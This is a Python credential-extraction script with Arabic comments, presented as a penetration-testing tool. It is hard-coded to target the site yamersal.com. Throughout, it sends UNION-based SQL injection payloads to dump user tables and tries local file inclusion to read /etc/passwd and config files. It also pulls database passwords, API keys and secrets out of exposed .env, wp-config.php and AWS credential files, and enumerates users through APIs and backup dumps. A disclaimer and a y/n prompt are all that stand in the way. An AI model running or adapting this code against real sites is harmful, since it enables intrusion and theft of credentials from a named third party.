#!/usr/bin/env python3
"""
Yamersal Credential Hunter
Advanced Credential Extraction Tool for Penetration Testing
Author: Security Researcher
Version: 2.2 - Organized Output
"""

import requests
import json
import urllib.parse
import re
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor

class CredentialHunter:
    def __init__(self, target="https://yamersal.com"):
        self.target = target
        self.session = requests.Session()
        self.credentials_found = []
        self.vulnerable_endpoints = []
        
        # Configure session headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

    def print_status(self, message, level="INFO"):
        """Print colored status messages"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def test_connection(self):
        """Test if target is accessible"""
        try:
            response = self.session.get(self.target, timeout=10)
            if response.status_code == 200:
                self.print_status(f"Target is accessible: {self.target}", "SUCCESS")
                return True
            else:
                self.print_status(f"Target responded with status: {response.status_code}", "WARNING")
                return True
        except Exception as e:
            self.print_status(f"Target is not accessible: {e}", "ERROR")
            return False

    def extract_from_sql_injection(self):
        """Extract credentials using SQL Injection - ORGANIZED OUTPUT"""
        self.print_status("Attempting SQL Injection credential extraction...", "INFO")
        
        sql_payloads = [
            "' UNION SELECT user_login,user_pass,user_email FROM wp_users--",
            "' UNION SELECT username,password,email FROM users--",
            "' UNION SELECT username,password,email FROM admin_users--"
        ]
        
        parameters = ['id', 'page', 'file', 'path', 'view']
        found_credentials = []
        
        for param in parameters:
            self.print_status(f"Testing parameter: {param}", "INFO")
            for payload in sql_payloads:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        # البحث عن أنماط محددة
                        if any(indicator in content.lower() for indicator in ['admin', 'user', 'password', 'email', 'username']):
                            
                            credential_data = {
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'findings': []
                            }
                            
                            # استخراج أسماء المستخدمين
                            username_match = re.search(r'(admin|user|username)[^<>\n]*?([a-zA-Z0-9_@\.-]+)', content, re.IGNORECASE)
                            email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', content)
                            hash_match = re.search(r'([a-fA-F0-9]{32})', content)
                            
                            if username_match:
                                username = username_match.group(2) if username_match.group(2) else username_match.group(1)
                                if len(username) > 2:  # تجنب النتائج القصيرة
                                    credential_data['findings'].append(f"Username: {username}")
                                    self.print_status(f"   ✅ Found username: {username}", "SUCCESS")
                            
                            if email_match and len(email_match.group(1)) > 5:
                                credential_data['findings'].append(f"Email: {email_match.group(1)}")
                                self.print_status(f"   ✅ Found email: {email_match.group(1)}", "SUCCESS")
                            
                            if hash_match:
                                credential_data['findings'].append(f"Hash: {hash_match.group(1)}")
                                self.print_status(f"   ✅ Found hash: {hash_match.group(1)}", "SUCCESS")
                            
                            if credential_data['findings']:
                                found_credentials.append(credential_data)
                                self.print_status(f"   🔗 URL: {test_url}", "INFO")
                                
                except Exception as e:
                    continue
    
        # طباعة ملخص منظم لـ SQL Injection
        if found_credentials:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 SQL INJECTION RESULTS SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for i, cred in enumerate(found_credentials, 1):
                self.print_status(f"\n[{i}] Parameter: {cred['parameter']}", "INFO")
                self.print_status(f"   URL: {cred['url']}", "INFO")
                for finding in cred['findings']:
                    if "Username:" in finding:
                        self.print_status(f"   👤 {finding}", "SUCCESS")
                    elif "Email:" in finding:
                        self.print_status(f"   📧 {finding}", "SUCCESS")
                    elif "Hash:" in finding:
                        self.print_status(f"   🔑 {finding}", "CRITICAL")
        
        return found_credentials

    def extract_from_config_files(self):
        """Extract credentials from exposed configuration files - ORGANIZED OUTPUT"""
        self.print_status("Scanning for exposed configuration files...", "INFO")
        
        config_files = [
            '/.env', '/wp-config.php', '/config.php',
            '/.aws/credentials', '/web.config', '/appsettings.json'
        ]
        
        found_configs = []
        
        for config_file in config_files:
            try:
                url = f"{self.target}{config_file}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    content = response.text
                    config_data = {
                        'file': config_file,
                        'url': url,
                        'credentials': []
                    }
                    
                    self.print_status(f"✅ Config File Found: {config_file}", "SUCCESS")
                    self.print_status(f"   🔗 URL: {url}", "INFO")
                    
                    # البحث عن بيانات حساسة
                    patterns = {
                        'DB_USER': r"DB_USERNAME['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'DB_PASSWORD': r"DB_PASSWORD['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'DB_NAME': r"DB_NAME['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'DB_HOST': r"DB_HOST['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'API_KEY': r"API_KEY['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
                        'SECRET_KEY': r"SECRET_KEY['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]"
                    }
                    
                    for key, pattern in patterns.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if match and len(match) > 3:
                                config_data['credentials'].append(f"{key}: {match}")
                                self.print_status(f"   🔑 {key}: {match}", "CRITICAL")
                    
                    if config_data['credentials']:
                        found_configs.append(config_data)
                        
            except Exception as e:
                continue
        
        # طباعة ملخص ملفات التكوين
        if found_configs:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 CONFIG FILES SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for config in found_configs:
                self.print_status(f"\n📁 File: {config['file']}", "INFO")
                self.print_status(f"🔗 URL: {config['url']}", "INFO")
                for cred in config['credentials']:
                    self.print_status(f"   {cred}", "CRITICAL")
        
        return found_configs

    def extract_from_exposed_apis(self):
        """Extract credentials from exposed API endpoints - ORGANIZED OUTPUT"""
        self.print_status("Scanning exposed API endpoints for credentials...", "INFO")
        
        api_endpoints = [
            '/wp-json/wp/v2/users',
            '/api/users',
            '/api/admin/list',
            '/admin/api/accounts'
        ]
        
        found_apis = []
        
        for endpoint in api_endpoints:
            try:
                url = f"{self.target}{endpoint}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    api_data = {
                        'endpoint': endpoint,
                        'url': url,
                        'users': []
                    }
                    
                    self.print_status(f"✅ API Endpoint Found: {endpoint}", "SUCCESS")
                    self.print_status(f"   🔗 URL: {url}", "INFO")
                    
                    try:
                        data = response.json()
                        if isinstance(data, list):
                            for user in data[:5]:  # عرض أول 5 مستخدمين فقط
                                username = user.get('username') or user.get('user_login') or user.get('name')
                                email = user.get('email')
                                if username and len(username) > 2:
                                    user_info = f"👤 {username}"
                                    if email:
                                        user_info += f" | 📧 {email}"
                                    api_data['users'].append(user_info)
                                    self.print_status(f"   {user_info}", "SUCCESS")
                    except:
                        # البحث في النص العادي
                        users = re.findall(r'"username":\s*"([^"]+)"', response.text)
                        emails = re.findall(r'"email":\s*"([^"]+)"', response.text)
                        
                        for i, user in enumerate(users[:5]):
                            user_info = f"👤 {user}"
                            if i < len(emails):
                                user_info += f" | 📧 {emails[i]}"
                            api_data['users'].append(user_info)
                            self.print_status(f"   {user_info}", "SUCCESS")
                    
                    if api_data['users']:
                        found_apis.append(api_data)
                        
            except Exception as e:
                continue
        
        # طباعة ملخص الـ APIs
        if found_apis:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 EXPOSED APIS SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for api in found_apis:
                self.print_status(f"\n🌐 Endpoint: {api['endpoint']}", "INFO")
                self.print_status(f"🔗 URL: {api['url']}", "INFO")
                for user in api['users']:
                    self.print_status(f"   {user}", "SUCCESS")
        
        return found_apis

    def extract_from_backup_files(self):
        """Extract credentials from backup files - ORGANIZED OUTPUT"""
        self.print_status("Searching for backup files...", "INFO")
        
        backup_files = [
            '/backup.zip', '/dump.sql', '/database.sql',
            '/backup.sql', '/backup.tar.gz'
        ]
        
        found_backups = []
        
        for backup_file in backup_files:
            try:
                url = f"{self.target}{backup_file}"
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    self.print_status(f"✅ Backup File Found: {backup_file}", "SUCCESS")
                    self.print_status(f"   🔗 URL: {url}", "INFO")
                    self.print_status(f"   📦 File Size: {len(response.content)} bytes", "INFO")
                    
                    found_backups.append({
                        'file': backup_file,
                        'url': url,
                        'size': len(response.content)
                    })
                        
            except Exception as e:
                continue
        
        # طباعة ملخص ملفات النسخ الاحتياطي
        if found_backups:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 BACKUP FILES SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for backup in found_backups:
                self.print_status(f"\n📦 File: {backup['file']}", "INFO")
                self.print_status(f"🔗 URL: {backup['url']}", "INFO")
                self.print_status(f"💾 Size: {backup['size']} bytes", "INFO")
        
        return found_backups

    def extract_from_lfi(self):
        """Extract credentials via LFI vulnerabilities - ORGANIZED OUTPUT"""
        self.print_status("Attempting LFI credential extraction...", "INFO")
        
        sensitive_files = [
            '/etc/passwd',
            '../../wp-config.php',
            '/var/www/html/.env',
            '/var/www/html/config.php'
        ]
        
        parameters = ['file', 'path', 'load', 'page']
        found_lfi = []
        
        for param in parameters:
            self.print_status(f"Testing LFI with parameter: {param}", "INFO")
            for file_path in sensitive_files:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(file_path)}"
                    response = self.session.get(test_url, timeout=8)
                    
                    if response.status_code == 200:
                        content = response.text
                        lfi_data = {
                            'parameter': param,
                            'file': file_path,
                            'url': test_url,
                            'findings': []
                        }
                        
                        # التحقق من نجاح LFI
                        if 'wp-config' in file_path and ('DB_PASSWORD' in content or 'DB_USER' in content):
                            lfi_data['findings'].append("WordPress configuration exposed")
                            self.print_status(f"   ✅ LFI Success: {file_path}", "CRITICAL")
                            self.print_status(f"   🔗 URL: {test_url}", "INFO")
                            
                        elif '/etc/passwd' in file_path and 'root:' in content:
                            lfi_data['findings'].append("System passwd file exposed")
                            self.print_status(f"   ✅ LFI Success: {file_path}", "CRITICAL")
                            self.print_status(f"   🔗 URL: {test_url}", "INFO")
                            
                        elif '.env' in file_path and ('DB_PASSWORD' in content or 'API_KEY' in content):
                            lfi_data['findings'].append("Environment file exposed")
                            self.print_status(f"   ✅ LFI Success: {file_path}", "CRITICAL")
                            self.print_status(f"   🔗 URL: {test_url}", "INFO")
                        
                        if lfi_data['findings']:
                            found_lfi.append(lfi_data)
                            
                except Exception as e:
                    continue
        
        # طباعة ملخص LFI
        if found_lfi:
            self.print_status("\n" + "="*70, "INFO")
            self.print_status("🎯 LFI VULNERABILITIES SUMMARY", "SUCCESS")
            self.print_status("="*70, "INFO")
            
            for lfi in found_lfi:
                self.print_status(f"\n📁 File: {lfi['file']}", "INFO")
                self.print_status(f"🔗 URL: {lfi['url']}", "INFO")
                for finding in lfi['findings']:
                    self.print_status(f"   ✅ {finding}", "CRITICAL")
        
        return found_lfi

    def run_comprehensive_scan(self):
        """Run comprehensive scan with organized output"""
        self.print_status("Starting organized credential extraction scan...", "CRITICAL")
        
        if not self.test_connection():
            return
        
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("🚀 CREDENTIAL HUNTING SCAN STARTED", "CRITICAL")
        self.print_status("="*80, "INFO")
        
        # تشغيل جميع الفحوصات
        sql_results = self.extract_from_sql_injection()
        config_results = self.extract_from_config_files()
        api_results = self.extract_from_exposed_apis()
        backup_results = self.extract_from_backup_files()
        lfi_results = self.extract_from_lfi()
        
        # جمع جميع النتائج
        all_results = {
            'sql_injection': sql_results,
            'config_files': config_results,
            'exposed_apis': api_results,
            'backup_files': backup_results,
            'lfi_vulnerabilities': lfi_results
        }
        
        # الملخص النهائي
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("📊 SCAN COMPLETED - FINAL SUMMARY", "SUCCESS")
        self.print_status("="*80, "INFO")
        
        total_findings = len(sql_results) + len(config_results) + len(api_results) + len(backup_results) + len(lfi_results)
        
        self.print_status(f"✅ SQL Injection: {len(sql_results)} vulnerable parameters", "SUCCESS")
        self.print_status(f"✅ Config Files: {len(config_results)} exposed files", "SUCCESS")
        self.print_status(f"✅ API Endpoints: {len(api_results)} exposed APIs", "SUCCESS")
        self.print_status(f"✅ Backup Files: {len(backup_results)} found", "SUCCESS")
        self.print_status(f"✅ LFI Vulnerabilities: {len(lfi_results)} found", "SUCCESS")
        self.print_status(f"🎯 TOTAL VULNERABILITIES FOUND: {total_findings}", "CRITICAL")
        
        if total_findings > 0:
            self.print_status(f"🚨 SECURITY WARNING: {total_findings} vulnerabilities detected!", "CRITICAL")
        else:
            self.print_status("🛡️  No critical vulnerabilities detected", "SUCCESS")
        
        self.generate_report(all_results)

    def generate_report(self, results):
        """Generate comprehensive report"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"credential_hunter_report_{timestamp}.json"
        
        report = {
            'target': self.target,
            'scan_timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'results': results,
            'summary': {
                'total_vulnerabilities': sum(len(v) for v in results.values()),
                'vulnerability_types': {k: len(v) for k, v in results.items()}
            }
        }
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=4, ensure_ascii=False)
            self.print_status(f"\n💾 Detailed report saved to: {filename}", "SUCCESS")
        except Exception as e:
            self.print_status(f"❌ Failed to save report: {e}", "ERROR")

def main():
    """Main function"""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                         CREDENTIAL HUNTER v2.2                              ║
║                   Organized Credential Extraction Tool                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("Enter target URL (default: https://yamersal.com): ").strip()
        if not target:
            target = "https://yamersal.com"
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print(f"\n⚠️  LEGAL DISCLAIMER: This tool is for authorized penetration testing only!")
    print(f"⚠️  Unauthorized use may be illegal in your jurisdiction!")
    print(f"⚠️  Use only on systems you own or have explicit permission to test!\n")
    
    confirm = input("Do you have authorization to test this target? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled. Exiting...")
        sys.exit(0)
    
    try:
        hunter = CredentialHunter(target)
        hunter.run_comprehensive_scan()
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user. Exiting...")
    except Exception as e:
        print(f"\nScan failed with error: {e}")

if __name__ == "__main__":
    main()